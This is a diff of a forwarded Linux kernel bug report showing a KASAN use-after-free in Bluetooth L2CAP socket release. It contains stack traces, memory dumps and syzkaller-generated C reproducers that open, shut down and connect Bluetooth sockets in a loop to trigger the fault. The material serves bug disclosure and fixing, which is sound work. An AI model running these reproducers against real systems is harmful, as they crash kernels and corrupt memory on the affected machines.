+slab_free_hook mm/slub.c:1371 [inline]
+slab_free_freelist_hook mm/slub.c:1398 [inline]
+slab_free mm/slub.c:2953 [inline]
+kfree+0xe0/0x280 mm/slub.c:3906
+sk_prot_free net/core/sock.c:1505 [inline]
+__sk_destruct+0x4b2/0x670 net/core/sock.c:1587
+sk_destruct+0x6e/0x80 net/core/sock.c:1595
+__sk_free+0xc2/0x2e0 net/core/sock.c:1606
+sk_free+0x39/0x40 net/core/sock.c:1617
+sock_put include/net/sock.h:1691 [inline]
+l2cap_sock_kill.part.6+0x6a/0x80 net/bluetooth/l2cap_sock.c:1055
+l2cap_sock_kill net/bluetooth/l2cap_sock.c:1206 [inline]
+l2cap_sock_release+0x181/0x1d0 net/bluetooth/l2cap_sock.c:1204
+__sock_release+0xce/0x240 net/socket.c:579
+sock_close+0x15/0x20 net/socket.c:1139
+__fput+0x2c7/0x7a0 fs/file_table.c:278
+task_work_run+0x14b/0x1c0 kernel/task_work.c:113
+get_signal+0x12ce/0x16c0 kernel/signal.c:2343
+do_signal+0x8f/0x16b0 arch/x86/kernel/signal.c:816
+exit_to_usermode_loop+0x17f/0x1c0 arch/x86/entry/common.c:162
+prepare_exit_to_usermode arch/x86/entry/common.c:197 [inline]
+syscall_return_slowpath arch/x86/entry/common.c:268 [inline]
+do_syscall_64+0x3ed/0x500 arch/x86/entry/common.c:293
+entry_SYSCALL_64_after_hwframe+0x49/0xbe
+
+The buggy address belongs to the object at ffff880069d26600
+which belongs to the cache kmalloc-2048 of size 2048
+The buggy address is located 160 bytes inside of
+2048-byte region [ffff880069d26600, ffff880069d26e00)
+The buggy address belongs to the page:
+page:ffffea0001a74800 count:1 mapcount:0 mapping:ffff88006cc02d80 index:0xffff880069d27700 compound_mapcount: 0
+flags: 0x100000000008100(slab|head)
+raw: 0100000000008100 ffffea0001428000 0000000400000004 ffff88006cc02d80
+raw: ffff880069d27700 00000000800f000b 00000001ffffffff 0000000000000000
+page dumped because: kasan: bad access detected
 
 Memory state around the buggy address:
-ffffffffa99c9e80: fa fa fa fa 00 00 00 00 00 00 fa fa fa fa fa fa
-ffffffffa99c9f00: 00 00 00 00 00 00 fa fa fa fa fa fa 00 00 07 fa
->ffffffffa99c9f80: fa fa fa fa 00 00 00 00 fa fa fa fa 00 04 fa fa
-                                                          ^
-ffffffffa99ca000: fa fa fa fa 00 fa fa fa fa fa fa fa 04 fa fa fa
-ffffffffa99ca080: fa fa fa fa 00 04 fa fa fa fa fa fa 00 00 00 01
+ffff880069d26580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+ffff880069d26600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+>ffff880069d26680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+                               ^
+ffff880069d26700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+ffff880069d26780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 
 
-       and here is the log I reproduce, and the poc, it will cause the problem stabily.
-              r0 = syz_init_net_socket$bt_sco(0x1f, 0x5, 0x2)
-connect$bt_sco(r0, &(0x7f0000000000)={0x1f, {0x0, 0x800, 0x0, 0x0, 0x11, 0x7}}, 0x8)
-r1 = syz_init_net_socket$bt_sco(0x1f, 0x5, 0x2)
-connect$bt_sco(r1, &(0x7f0000000000)={0x1f, {0x0, 0x800, 0x0, 0xffffffffffff5577, 0x11, 0x7}}, 0x8)
-connect$bt_sco(0xffffffffffffffff, &(0x7f0000000000)={0x1f, {0x0, 0x800, 0x1, 0xffffffffffff5577, 0x11, 0x7}}, 0x8)
-r2 = syz_init_net_socket$bt_sco(0x1f, 0x5, 0x2)
-connect$bt_sco(r2, &(0x7f0000000000)={0x1f, {0x8, 0x800, 0x1, 0xffffffffffff5577, 0x11, 0x7}}, 0x8)
+
+
+
+POC:
+// r0 = syz_init_net_socket$bt_l2cap(0x1f, 0x3, 0x0)
+// shutdown(r0, 0x1)
+// connect$bt_l2cap(r0, &(0x7f0000000000), 0xe)
+
+// autogenerated by syzkaller (https://github.com/google/syzkaller)
 
 #define _GNU_SOURCE
 
+#include <dirent.h>
 #include <endian.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
+
+static void sleep_ms(uint64_t ms)
+{
+    usleep(ms * 1000);
+}
+
+static uint64_t current_time_ms(void)
+{
+    struct timespec ts;
+    if (clock_gettime(CLOCK_MONOTONIC, &ts))
+    exit(1);
+    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
+}
 
 static long syz_init_net_socket(long domain, long type, long proto)
 {
-  return syscall(__NR_socket, domain, type, proto);
+    return syscall(__NR_socket, domain, type, proto);
 }
 
-uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
+static void kill_and_wait(int pid, int* status)
+{
+    kill(-pid, SIGKILL);
+    kill(pid, SIGKILL);
+    int i;
+    for (i = 0; i < 100; i++) {
+        if (waitpid(-1, status, WNOHANG | __WALL) == pid)
+            return;
+        usleep(1000);
+    }
+    DIR* dir = opendir("/sys/fs/fuse/connections");
+    if (dir) {
+        for (;;) {
+            struct dirent* ent = readdir(dir);
+            if (!ent)
+                break;
+            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
+                continue;
+            char abort[300];
+            snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
+            int fd = open(abort, O_WRONLY);
+            if (fd == -1) {
+                continue;
+            }
+            if (write(fd, abort, 1) < 0) {
+            }
+            close(fd);
+        }
+        closedir(dir);
+    } else {
+    }
+    while (waitpid(-1, status, __WALL) != pid) {
+    }
+}
 
+#define SYZ_HAVE_SETUP_TEST 1
+static void setup_test()
+{
+    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
+    setpgrp();
+}
+
+#define SYZ_HAVE_RESET_TEST 1
+static void reset_test()
+{
+    int fd;
+    for (fd = 3; fd < 30; fd++)
+        close(fd);
+}
+
+static void execute_one(void);
+
+#define WAIT_FLAGS __WALL
+
+static void loop(void)
+{
+    int iter;
+    for (iter = 0;; iter++) {
+        int pid = fork();
+        if (pid < 0)
+    exit(1);
+        if (pid == 0) {
+            setup_test();
+            execute_one();
+            reset_test();
+            exit(0);
+        }
+        int status = 0;
+        uint64_t start = current_time_ms();
+        for (;;) {
+            if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
+                break;
+            sleep_ms(1);
+            if (current_time_ms() - start < 5 * 1000)
+                continue;
+            kill_and_wait(pid, &status);
+            break;
+        }
+    }
+}
+
+uint64_t r[1] = {0xffffffffffffffff};
+
+void execute_one(void)
+{
+        long res = 0;
+    res = syz_init_net_socket(0x1f, 3, 0);
+    if (res != -1)
+        r[0] = res;
+    syscall(__NR_shutdown, r[0], 1);
+*(uint16_t*)0x20000000 = 0x1f;
+*(uint16_t*)0x20000002 = 0;
+*(uint8_t*)0x20000004 = 0;
+*(uint8_t*)0x20000005 = 0;
+*(uint8_t*)0x20000006 = 0;
+*(uint8_t*)0x20000007 = 0;
+*(uint8_t*)0x20000008 = 0;
+*(uint8_t*)0x20000009 = 0;
+*(uint16_t*)0x2000000a = 0;
+*(uint8_t*)0x2000000c = 0;
+    syscall(__NR_connect, r[0], 0x20000000, 0xe);
+
+}
 int main(void)
 {
-    for(int i=0; i<100; i++){
         syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
-        long res = 0;
-        res = syz_init_net_socket(0x1f, 5, 2);
-        if (res != -1)
-        r[0] = res;
-        *(uint16_t*)0x20000000 = 0x1f;
-        *(uint8_t*)0x20000002 = 0;
-        *(uint8_t*)0x20000003 = 0;
-        *(uint8_t*)0x20000004 = 0;
-        *(uint8_t*)0x20000005 = 0;
-       *(uint8_t*)0x20000006 = 0x11;
-        *(uint8_t*)0x20000007 = 7;
-        syscall(__NR_connect, r[0], 0x20000000, 8);
-        res = syz_init_net_socket(0x1f, 5, 2);
-        if (res != -1)
-        r[1] = res;
-        *(uint16_t*)0x20000000 = 0x1f;
-        *(uint8_t*)0x20000002 = 0;
-        *(uint8_t*)0x20000003 = 0;
-        *(uint8_t*)0x20000004 = 0;
-        *(uint8_t*)0x20000005 = 0x77;
-        *(uint8_t*)0x20000006 = 0x11;
-        *(uint8_t*)0x20000007 = 7;
-        syscall(__NR_connect, r[1], 0x20000000, 8);
-        *(uint16_t*)0x20000000 = 0x1f;
-        *(uint8_t*)0x20000002 = 0;
-        *(uint8_t*)0x20000003 = 0;
-        *(uint8_t*)0x20000004 = 1;
-        *(uint8_t*)0x20000005 = 0x77;
-        *(uint8_t*)0x20000006 = 0x11;
-        *(uint8_t*)0x20000007 = 7;
-        syscall(__NR_connect, -1, 0x20000000, 8);
-        res = syz_init_net_socket(0x1f, 5, 2);
-        if (res != -1)
-        r[2] = res;
-        *(uint16_t*)0x20000000 = 0x1f;
-        *(uint8_t*)0x20000002 = 8;
-        *(uint8_t*)0x20000003 = 0;
-        *(uint8_t*)0x20000004 = 1;
-        *(uint8_t*)0x20000005 = 0x77;
-        *(uint8_t*)0x20000006 = 0x11;
-        *(uint8_t*)0x20000007 = 7;
-        syscall(__NR_connect, r[2], 0x20000000, 8);
-    }
-  return 0;
+            loop();
+    return 0;
 }
 
 
-And the final is the config:
-
-
+FINAL is the config:
 #
 # Automatically generated file; DO NOT EDIT.
 # Linux/x86 4.19.0-rc3 Kernel Configuration
@@ -4880,6 +5082,9 @@ CONFIG_X86_DEBUG_FPU=y
 # CONFIG_PUNIT_ATOM_DEBUG is not set
 CONFIG_UNWINDER_ORC=y
 # CONFIG_UNWINDER_FRAME_POINTER is not set
+
+
+
 
 
 ----- End forwarded message -----
